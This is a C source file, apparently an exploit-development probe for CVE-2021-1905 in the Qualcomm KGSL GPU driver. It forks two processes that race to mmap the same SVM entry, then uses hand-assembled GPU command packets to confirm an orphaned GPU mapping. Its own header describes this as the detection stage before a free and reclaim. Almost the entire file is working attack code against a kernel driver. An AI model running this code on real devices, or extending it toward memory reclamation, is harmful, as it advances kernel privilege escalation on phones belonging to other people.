/* kgsl-race.c — CVE-2021-1905 patch#2 race: two processes (fork + inherited kgsl
 * fd, separate mm) mmap the SAME SVM entry simultaneously.
 *
 * No lock in _gpu_set_svm_region (vulnerable) => two regions can be mapped, but
 * only one is tracked by memdesc->gpuaddr.  The other is an orphaned GPU mapping
 * that survives free().
 *
 * This build only DETECTS the race (does not free/reclaim yet):
 *   - parent and child mmap a large SVM entry at the same moment
 *   - parent GPU-writes each candidate region and reads E's pages back
 *   - reports INFO.gpuaddr vs the two CPU vaddrs (== gpuaddrs for SVM)
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>

#define KGSL_IOC_TYPE 0x09
#define DEV "/dev/kgsl-3d0"
#define USE_CPU_MAP 0x10000000ULL
#define ESIZE 0x200000ULL          /* 2 MiB: widens the map window */
struct kgsl_gpumem_alloc_id { unsigned int id, flags; size_t size, mmapsize; unsigned long gpuaddr; unsigned long __pad[2]; };
struct kgsl_gpuobj_alloc { uint64_t size, flags, va_len, mmapsize; unsigned int id, metadata_len; uint64_t metadata; };
struct kgsl_gpuobj_info  { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
struct kgsl_drawctxt_create { unsigned int flags, drawctxt_id; };
struct kgsl_drawctxt_destroy { unsigned int drawctxt_id; };
struct kgsl_command_object { uint64_t offset, gpuaddr, size; unsigned int flags, id; };
struct kgsl_gpu_command { uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs; uint64_t synclist; unsigned int syncsize, numsyncs, context_id, timestamp; };
#define IOCTL_CTXT_CREATE   _IOWR(KGSL_IOC_TYPE,0x13,struct kgsl_drawctxt_create)
#define IOCTL_CTXT_DESTROY  _IOW (KGSL_IOC_TYPE,0x14,struct kgsl_drawctxt_destroy)
#define IOCTL_PMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE,0x34,struct kgsl_gpumem_alloc_id)
#define IOCTL_GPUOBJ_ALLOC  _IOWR(KGSL_IOC_TYPE,0x45,struct kgsl_gpuobj_alloc)
#define IOCTL_GPUOBJ_INFO   _IOWR(KGSL_IOC_TYPE,0x47,struct kgsl_gpuobj_info)
#define IOCTL_GPU_COMMAND   _IOWR(KGSL_IOC_TYPE,0x4A,struct kgsl_gpu_command)
#define KGSL_CONTEXT_PREAMBLE 0x10
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x2
#define KGSL_CMDBATCH_MEMLIST 0x1
#define KGSL_CMDLIST_IB 0x1
#define KGSL_OBJLIST_MEMOBJ 0x8
#define CP_MEM_WRITE 0x3d
static int fd; static uint32_t *cmd,*mark; static uint64_t cgpu,mgpu; static unsigned cid,ctx;
static void on_alarm(int s){ (void)s; write(1,"[!] alarm\n",10); _exit(0x42); }
static unsigned int parity(unsigned int v){ v^=v>>16; v^=v>>8; v^=v>>4; v&=0xf; return (0x9669u>>v)&1; }
static unsigned int t7(unsigned int op,unsigned int cnt){ cnt&=0x3fff;op&=0x7f; return (7u<<28)|cnt|(parity(cnt)<<15)|(op<<16)|(parity(op)<<23); }
static unsigned int *put_addr(unsigned int *p,uint64_t a){ *p++=(unsigned)a; *p++=(unsigned)(a>>32); return p; }
static uint32_t gwrite(uint64_t saddr,uint32_t sval,uint32_t mval){
    mark[0]=0;
    uint32_t *p=cmd; memset(cmd,0,0x40);
    *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,saddr); *p++=sval;
    *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,mgpu);  *p++=mval;
    struct kgsl_command_object cob; memset(&cob,0,sizeof cob);
    cob.gpuaddr=cgpu; cob.size=(uint64_t)(p-cmd)*4; cob.flags=KGSL_CMDLIST_IB;
    struct kgsl_command_object mo; memset(&mo,0,sizeof mo);
    mo.gpuaddr=cgpu; mo.size=0x10000; mo.flags=KGSL_OBJLIST_MEMOBJ; mo.id=cid;
    struct kgsl_gpu_command gc; memset(&gc,0,sizeof gc);
    gc.flags=KGSL_CMDBATCH_MEMLIST; gc.context_id=ctx;
    gc.cmdlist=(uint64_t)(uintptr_t)&cob; gc.cmdsize=sizeof cob; gc.numcmds=1;
    gc.objlist=(uint64_t)(uintptr_t)&mo; gc.objsize=sizeof mo; gc.numobjs=1;
    ioctl(fd,IOCTL_GPU_COMMAND,&gc);
    for(int t=0;t<500;t++){ if(mark[0]==mval) break; usleep(1000); }
    return mark[0];
}
struct shared { volatile int go; volatile int done; volatile unsigned long vchild; };
int main(void){
    setvbuf(stdout,NULL,_IONBF,0); signal(SIGALRM,on_alarm); alarm(100);
    printf("== kgsl CVE-2021-1905 patch#2 RACE probe (uid=%d) ==\n",(int)getuid());
    fd=open(DEV,O_RDWR); if(fd<0){ printf("[-] open: %s\n",strerror(errno)); return 1; }

    struct kgsl_gpumem_alloc_id ca; memset(&ca,0,sizeof ca); ca.size=0x10000;
    ioctl(fd,IOCTL_PMEM_ALLOC_ID,&ca); cid=ca.id; cgpu=ca.gpuaddr;
    cmd=mmap(NULL,0x10000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)cid<<12); memset(cmd,0,0x10000);
    struct kgsl_gpumem_alloc_id ma; memset(&ma,0,sizeof ma); ma.size=0x1000;
    ioctl(fd,IOCTL_PMEM_ALLOC_ID,&ma); mgpu=ma.gpuaddr;
    mark=mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)ma.id<<12);
    struct kgsl_drawctxt_create cc; memset(&cc,0,sizeof cc);
    cc.flags=KGSL_CONTEXT_PREAMBLE|KGSL_CONTEXT_NO_GMEM_ALLOC;
    ioctl(fd,IOCTL_CTXT_CREATE,&cc); ctx=cc.drawctxt_id;

    struct kgsl_gpuobj_alloc sa; memset(&sa,0,sizeof sa);
    sa.size=ESIZE; sa.flags=USE_CPU_MAP; sa.va_len=ESIZE;
    if(ioctl(fd,IOCTL_GPUOBJ_ALLOC,&sa)<0){ printf("[-] svm alloc: %s\n",strerror(errno)); return 1; }
    unsigned id=sa.id;
    printf("[0] E id=%u size=0x%llx\n",id,(unsigned long long)ESIZE);

    struct shared *sh=mmap(NULL,sizeof(*sh),PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,-1,0);
    sh->go=0; sh->done=0; sh->vchild=0;

    pid_t pid=fork();
    if(pid==0){
        /* child: wait for the go signal, then mmap in its own mm */
        while(!sh->go) sched_yield();
        void *v=mmap(NULL,ESIZE,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)id<<12);
        sh->vchild=(unsigned long)v;
        sh->done=1;
        _exit(0);
    }
    /* parent: release both at once, then mmap */
    sh->go=1;
    void *vp=mmap(NULL,ESIZE,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)id<<12);
    for(int i=0;i<200000 && !sh->done;i++) sched_yield();
    waitpid(pid,NULL,0);

    unsigned long vc=sh->vchild;
    struct kgsl_gpuobj_info si; memset(&si,0,sizeof si); si.id=id;
    ioctl(fd,IOCTL_GPUOBJ_INFO,&si);
    printf("[1] vparent=%p vchild=0x%lx INFO.gpuaddr=0x%llx\n",vp,vc,(unsigned long long)si.gpuaddr);

    /* for SVM, CPU vaddr == gpuaddr, so the two candidate GPU regions are vp & vc */
    uint32_t rp=gwrite(0,0,0); /* warm */
    (void)rp;
    uint32_t m1=gwrite((uint64_t)(uintptr_t)vp,0xA0001111u,0xB1);
    uint32_t a1=((volatile uint32_t*)vp)[0];
    uint32_t m2=gwrite((uint64_t)vc,0xA0002222u,0xB2);
    uint32_t a2=((volatile uint32_t*)vp)[0];
    printf("[2] GPU-write vparent : marker=0x%x vp[0]=0x%08x %s\n",m1,a1,a1==0xA0001111u?"MAPPED":"not");
    printf("[3] GPU-write vchild  : marker=0x%x vp[0]=0x%08x %s\n",m2,a2,a2==0xA0002222u?"MAPPED":"not");

    if((si.gpuaddr==(uint64_t)(uintptr_t)vp) || (si.gpuaddr==(uint64_t)vc)){
        unsigned long other = (si.gpuaddr==(uint64_t)(uintptr_t)vp) ? vc : (unsigned long)(uintptr_t)vp;
        printf("[4] tracked=0x%llx  ORPHAN candidate=0x%lx\n",(unsigned long long)si.gpuaddr,other);
        printf("    => if both [2] and [3] are MAPPED, one region is orphaned.\n");
    } else {
        printf("[4] ***** NEITHER region is tracked (gpuaddr mismatch) => BOTH orphaned! *****\n");
    }
    { struct kgsl_drawctxt_destroy x={ctx}; ioctl(fd,IOCTL_CTXT_DESTROY,&x); }
    printf("== done ==\n"); return 0;
}
